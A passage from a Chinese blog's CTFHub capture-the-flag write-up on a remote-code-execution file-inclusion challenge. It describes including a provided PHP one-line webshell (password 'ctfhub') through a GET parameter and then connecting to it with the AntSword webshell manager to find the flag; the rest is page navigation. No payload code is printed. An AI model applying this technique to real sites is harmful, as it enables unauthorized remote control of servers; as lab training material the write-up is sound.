<p>发现是一个php一句话木马，连接密码是ctfhub，在文件shell.txt里，这时就要想到应该用蚁剑连接了，现用GET方法传file&#x3D;shell.txt，</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png"></p>
<p>文件包含成功，打开蚁剑，添加网站URL，</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png"></p>
<p>连接成功后，在根目录下找到了flag，</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cl9hxo4gp000020v4cad53qob" data-title="CTFHUB-RCE-文件包含" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">四月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">三月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/04/18/Github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/">Github搜索技巧</a>
          </li>
        
          <li>
            <a href="/2023/03/19/ssh%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%BF%E7%94%A8/">ssh原理及使用</a>
          </li>
        
          <li>
            <a href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/">复活Google翻译</a>
          </li>
        
          <li>
            <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">由NSSCTF-SWPUCTF-ez_ez_unserialize，引发对反序列具体详细过程以及对__construct，__destruct函数执行情况深度分析</a>
          </li>
        
          <li>
            <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/">NSWSTAR-week2-UnserializeOne</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 Jokak Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>